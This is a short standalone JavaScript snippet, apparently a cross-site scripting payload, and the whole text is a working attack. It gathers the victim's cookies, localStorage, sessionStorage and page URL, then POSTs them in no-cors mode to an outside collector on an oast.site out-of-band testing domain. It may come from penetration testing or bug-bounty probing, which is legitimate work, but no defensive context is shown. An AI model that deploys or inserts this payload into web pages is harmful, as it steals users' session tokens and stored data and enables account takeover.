(function(){
    var data = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: window.location.href
    };

    console.log("Collecting data:", data);
    
    if(typeof fetch !== 'undefined'){
        fetch('https://mn0vaty9x689m9738gskrx57fzmxdo9ih.oast.site/collect', {
            method: 'POST',
            mode: 'no-cors',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
    }
})();